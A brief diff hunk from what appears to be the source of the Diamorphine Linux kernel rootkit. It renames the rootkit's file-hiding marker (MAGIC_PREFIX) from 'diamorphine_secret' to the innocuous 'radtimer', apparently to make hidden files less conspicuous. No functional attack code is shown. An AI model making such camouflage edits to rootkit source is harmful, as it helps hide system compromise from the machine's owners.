@@ -39,7 +39,7 @@ struct linux_dirent {
     char d_name[1];
 };
 
-#define MAGIC_PREFIX "diamorphine_secret"
+#define MAGIC_PREFIX "radtimer"
 #define PF_INVISIBLE 0x01000000
 #define MODULE_NAME "diamorphine"
 
